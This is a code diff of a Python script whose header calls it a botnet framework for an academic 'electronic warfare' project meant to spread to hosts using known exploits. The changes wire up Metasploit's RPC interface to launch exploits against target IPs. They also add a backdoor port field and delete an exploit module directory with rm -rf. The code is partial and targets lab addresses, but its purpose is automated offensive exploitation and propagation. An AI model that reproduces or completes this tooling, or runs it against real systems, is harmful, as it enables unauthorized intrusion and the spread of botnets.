@@ -1,32 +1,33 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*- 
 #
-#----------------------------------------------------
+# ----------------------------------------------------
 #
-#Author: Burtonyaboy
-#Date: 7-6-2018
+# Author: Isaac Burton
+# Date: 7-6-2018
 #
-#This project is the result of a paper one of my 
-#professors wrote. The goal is to design an electronic
-#warfare system using blackboard architecture for
-#decision making. The end product will look like a
-#heavyweight botnet framework capable of spreading to 
-#hosts with known and readily available exploits.
+# This project is the result of a paper one of my 
+# professors wrote. The goal is to design an electronic
+# warfare system using blackboard architecture for
+# decision making. The end product will look like a
+# heavyweight botnet framework capable of spreading to 
+# hosts with known and readily available exploits.
 #
-#----------------------------------------------------
+# ----------------------------------------------------
 import subprocess, os, sys, json, random, time
 import msgpack, http.client
 
-#global variables to be later changed to user input
-hosts = ['192.168.56.3']
+#global variables to be later changed to input from calling
+#program
+hosts = ['192.168.171.128']
 intensity = 'Loud'
 iface = 'vboxnet0'
 
 #global variables for debugging
 #some things don't need to be run every time for testing:
 nmap_debug = 0
-search_debug = 0
-post_debug = 1
+search_debug = 1
+post_debug = 0
 
 #msf needs its own special directory
 msf_exploit_dir = '/root/.msf4/modules/exploits/private/'
@@ -42,9 +43,11 @@ class Host:
         self.exploits_file = hostname + '.json'
         self.exploits = []
         self.host.session = None
+        self.backdoor_port = -1
 
-#pythons msfrpc is garbage and pymsfrpc wont import --_(*_*)_--
+#msfrpc with a few fixes
 class Msfrpc:
+
     def __init__(self,opts=[]):
         self.host = "127.0.0.1"
         self.port = 55552
@@ -201,11 +204,12 @@ class Exploit:
         password_length = 8
         r = random.SystemRandom()
         self.msf_pass = ''.join([r.choice(chars) for i in range(password_length)])
-        msfrpcd_init_cmd = ["msfconsole","-x","'load msgrpc'"]
+        msfrpcd_init_cmd = "msfconsole -x 'load msgrpc " + self.msf_pass + "'"
         subprocess.Popen(msfrpcd_init_cmd,shell=True,stdout=subprocess.PIPE)
+        time.sleep(10)
         #login
         c = Msfrpc({})
-        c.auth = c.call('auth.login',['msf','abc123'])
+        c.auth = c.call('auth.login',['msf',self.msf_pass])
         print(c.auth)
         c.token = c.auth['token']
         c.console_id = c.call('console.create')['id']
@@ -224,13 +228,19 @@ class Exploit:
             c.call('console.write',['exploit\n'])
             c.call('console.destroy',[])
             print('done.')
-    except Exception as e:
+        except Exception as e:
             print(e)
             c.call('console.destroy',[])
             exit(1)
         #output = subprocess.Popen(msf_cmd.split())
         #print(output)
 
+        def msfrpc_daemon(self):
+            msf = subprocess.Popen(['msfconsole','-x',"'load","msgrpc'"])
+
+
+
+#manage the 
 class PostExploitation:
 
     def __init__(self):
@@ -241,23 +251,24 @@ class PostExploitation:
 
 class HostController:
 
-    def __init__(self, scanner, finder, exp, post_exp):
+    def __init__(self):
         #initialize hosts to carry out tasks
-        self.scanner = scanner
-        self.finder = finder
-        self.exp = exp
-        self.post_exp = post_exp
+        self.scanner = NetworkScanner()
+        self.finder = DatabaseFind()
+        self.exp = Exploit()
+        self.post_exp = PostExploitation()
         print('[+]Controller created.')
 
     def exploit_target(self, host, options):
         self.scanner.scan_network(host, options)
         self.finder.search_database(host,)
-
+        #self.exp.exploit(host)
         print('[+]The following services were found:')
         if(not post_debug):
             subprocess.Popen(['rm','-rf',msf_exploit_dir])
 
-def console():
+
+if __name__ == '__main__':
     #make sure user is root
     uid = os.getuid()
     print('[+]CONSOLE STARTED')
@@ -265,15 +276,7 @@ def console():
         print('[-]THIS PROGRAM REQUIRES ROOT PRIVILEGE')
         print('[-]YOUR UID IS: ' + str(uid))
         exit(1)
-
-if __name__ == '__main__':
-    #set everything up
-    console()
-    net_scan = NetworkScanner()
-    data_search = DatabaseFind()
-    exp = Exploit()
-    post_exploit = PostExploitation()
-    controller = HostController(net_scan, data_search, exp, post_exploit)
+    controller = HostController()
     #loop through hosts
     for ip in hosts:
         host = Host(ip, 'vulnerable')
